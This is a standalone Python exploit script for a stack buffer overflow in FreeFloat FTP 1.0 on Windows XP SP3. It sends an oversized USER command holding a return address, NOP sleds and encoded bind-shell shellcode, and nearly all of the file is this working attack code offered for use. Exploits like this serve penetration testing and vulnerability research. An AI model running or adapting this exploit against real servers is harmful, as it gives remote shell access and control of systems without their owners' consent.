# Exploit for FreeFloat_FTP_1.0 - Stack Buffer Overflow
# Author: Pal1Sec
# Tested on Windows XP Professional SP 3
#!/usr/bin/python
import socket
import sys

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((sys.argv[1], 21))
print sock.recv(1500)

shellcode_bind =  b""
shellcode_bind += b"\xda\xd3\xba\xb3\xb6\xc9\x96\xd9\x74\x24"
shellcode_bind += b"\xf4\x5e\x2b\xc9\xb1\x53\x31\x56\x17\x83"
shellcode_bind += b"\xee\xfc\x03\xe5\xa5\x2b\x63\xf5\x22\x29"
shellcode_bind += b"\x8c\x05\xb3\x4e\x04\xe0\x82\x4e\x72\x61"
shellcode_bind += b"\xb4\x7e\xf0\x27\x39\xf4\x54\xd3\xca\x78"
shellcode_bind += b"\x71\xd4\x7b\x36\xa7\xdb\x7c\x6b\x9b\x7a"
shellcode_bind += b"\xff\x76\xc8\x5c\x3e\xb9\x1d\x9d\x07\xa4"
shellcode_bind += b"\xec\xcf\xd0\xa2\x43\xff\x55\xfe\x5f\x74"
shellcode_bind += b"\x25\xee\xe7\x69\xfe\x11\xc9\x3c\x74\x48"
shellcode_bind += b"\xc9\xbf\x59\xe0\x40\xa7\xbe\xcd\x1b\x5c"
shellcode_bind += b"\x74\xb9\x9d\xb4\x44\x42\x31\xf9\x68\xb1"
shellcode_bind += b"\x4b\x3e\x4e\x2a\x3e\x36\xac\xd7\x39\x8d"
shellcode_bind += b"\xce\x03\xcf\x15\x68\xc7\x77\xf1\x88\x04"
shellcode_bind += b"\xe1\x72\x86\xe1\x65\xdc\x8b\xf4\xaa\x57"
shellcode_bind += b"\xb7\x7d\x4d\xb7\x31\xc5\x6a\x13\x19\x9d"
shellcode_bind += b"\x13\x02\xc7\x70\x2b\x54\xa8\x2d\x89\x1f"
shellcode_bind += b"\x45\x39\xa0\x42\x02\x8e\x89\x7c\xd2\x98"
shellcode_bind += b"\x9a\x0f\xe0\x07\x31\x87\x48\xcf\x9f\x50"
shellcode_bind += b"\xae\xfa\x58\xce\x51\x05\x99\xc7\x95\x51"
shellcode_bind += b"\xc9\x7f\x3f\xda\x82\x7f\xc0\x0f\x3e\x77"
shellcode_bind += b"\x67\xe0\x5d\x7a\xd7\x50\xe2\xd4\xb0\xba"
shellcode_bind += b"\xed\x0b\xa0\xc4\x27\x24\x49\x39\xc8\x69"
shellcode_bind += b"\xa3\xb4\x2e\x07\xa3\x90\xf9\xbf\x01\xc7"
shellcode_bind += b"\x31\x58\x79\x2d\x6a\xce\x32\x27\xad\xf1"
shellcode_bind += b"\xc2\x6d\x99\x65\x49\x62\x1d\x94\x4e\xaf"
shellcode_bind += b"\x35\xc1\xd9\x25\xd4\xa0\x78\x39\xfd\x52"
shellcode_bind += b"\x18\xa8\x9a\xa2\x57\xd1\x34\xf5\x30\x27"
shellcode_bind += b"\x4d\x93\xac\x1e\xe7\x81\x2c\xc6\xc0\x01"
shellcode_bind += b"\xeb\x3b\xce\x88\x7e\x07\xf4\x9a\x46\x88"
shellcode_bind += b"\xb0\xce\x16\xdf\x6e\xb8\xd0\x89\xc0\x12"
shellcode_bind += b"\x8b\x66\x8b\xf2\x4a\x45\x0c\x84\x52\x80"
shellcode_bind += b"\xfa\x68\xe2\x7d\xbb\x97\xcb\xe9\x4b\xe0"
shellcode_bind += b"\x31\x8a\xb4\x3b\xf2\xaa\x56\xe9\x0f\x43"
shellcode_bind += b"\xcf\x78\xb2\x0e\xf0\x57\xf1\x36\x73\x5d"
shellcode_bind += b"\x8a\xcc\x6b\x14\x8f\x89\x2b\xc5\xfd\x82"
shellcode_bind += b"\xd9\xe9\x52\xa2\xcb"

nops = 20 * "\x90"

buffer = "A"*230 + "\x73\x18\x75\x74" + nops + shellcode_bind + nops + "C" * (1000-230-4 - len(shellcode_bind)-len(2*nops))

sock.send("USER " + buffer + "\r\n")
print sock.recv(1500)
sock.send("PASS \r\n")
print sock.recv(1500)
sock.close()
